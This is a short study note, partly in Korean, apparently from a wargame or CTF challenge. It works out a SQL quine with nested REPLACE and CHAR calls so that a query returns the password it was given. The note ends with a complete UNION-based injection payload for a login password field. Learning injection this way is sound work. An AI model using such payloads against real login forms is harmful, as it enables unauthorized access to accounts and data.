SELECT REPLACE(REPLACE(
    'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")',CHAR(34),CHAR(39)),
    CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")');

replace를 2중으로 한다.
select replace(replace('select replace(replace("$",char(34),char(39))'    )    )

# char 34 : ""
# char 36 : $
# char 39 : ''

내가 입력한 PW가 그대로 출력으로 나온다,,,
a' 

a' union select replace(replace('a" union select replace(replace("$",char(34),char(39)),char(36),"$") as pw#',char(34),char(39)),char(36),'a" union select replace(replace("$",char(34),char(39)),char(36),"$") as pw#') as pw#